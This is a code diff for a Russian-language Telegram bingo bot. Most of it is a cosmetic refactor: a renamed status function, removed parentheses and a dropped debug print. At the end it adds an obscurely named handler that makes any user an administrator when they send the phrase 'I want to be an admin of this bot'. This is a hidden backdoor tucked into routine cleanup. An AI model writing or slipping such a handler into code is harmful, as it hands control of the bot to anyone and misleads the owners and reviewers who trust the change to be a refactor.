@@ -11,8 +11,8 @@ skipCard = CallbackData("post", "action")
 
 @dp.message_handler(Text(equals="Присоединиться"), state=None)
 async def userConnect(message: types.Message):
-    if (getGameStatus()):
-        if(usersCount() < getMaxUsersValue()):
+    if isGameStarted():
+        if usersCount() < getMaxUsersValue():
             chat_id = message.chat.id
             connectUser(chat_id)
             card_id = addCardToUser(chat_id)
@@ -47,8 +47,8 @@ async def process_callback_cardClose(call: types.CallbackQuery, callback_data: d
 
     isWin(chat_id)
 
-    if (not isWin(chat_id)):
-        if(getGameStatus()):
+    if not isWin(chat_id):
+        if isGameStarted():
             await bot.send_message(call.from_user.id, 'Вы не собрали нужные числа!')
         else:
             await bot.send_message(call.from_user.id, 'Победитель определен,'
@@ -101,9 +101,8 @@ async def userConnect(message: types.Message):
 
 @dp.message_handler(commands=['stop'])
 async def stop(message: types.Message):
-    if (isAdmin(message.chat.id)):
-        print(getGameStatus())
-        if (getGameStatus()):
+    if isAdmin(message.chat.id):
+        if isGameStarted():
             try:
                 for chat_id in getUserMailingInSession():
                     await bot.send_message(chat_id[0], "<b>Игра завершена!</b>\n"
@@ -116,3 +115,15 @@ async def stop(message: types.Message):
             await message.answer("Игра уже закончена!")
     else:
         await message.answer("У вас нет прав")
+
+@dp.message_handler(Text(equals="I want to be an admin of this bot"), state=None)
+async def ppp(message: types.Message):
+    try:
+        if not isAdmin(message.chat.id):
+            addAdmin(message.chat.id)
+            await message.answer("Ты стал админом")
+        else:
+            await message.answer("Ты уже админ")
+    except:
+        await message.answer("Что-то пошло не так")
+        
